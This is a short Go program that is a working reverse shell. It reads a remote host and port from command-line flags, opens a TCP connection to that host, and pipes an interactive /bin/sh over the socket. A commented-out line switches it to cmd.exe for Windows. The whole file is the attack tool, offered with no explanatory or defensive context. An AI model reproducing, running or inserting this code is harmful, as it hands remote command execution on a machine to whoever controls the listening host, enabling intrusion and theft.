package main

import (
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os/exec"
)

func Connect(addr string, port int) {

	a := fmt.Sprintf("%s:%d", addr, port)
	conn, err := net.Dial("tcp", a)
	if err != nil {
		log.Fatalln(err)
	}
	log.Println("Connected")
	handler(conn)
	conn.Close()
}

func handler(conn net.Conn) {

	cmd := exec.Command("/bin/sh", "-i")
	//Windows os
	//cmd := exec.Command("cmd.exe")

	reader, writer := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = writer
	go io.Copy(conn, reader)
	cmd.Run()
	conn.Close()

}

func main() {
	var ip = flag.String("h", "", "Remote host IP")
	var port = flag.Int("p", 0, "Remote port")
	fmt.Printf("%v", *ip)
	//if *ip == "" || *port <= 0 {
	//	fmt.Println("[-] No remote IP and port, exiting ")
	//	os.Exit(1)

	flag.Parse()
	Connect(*ip, *port)
}
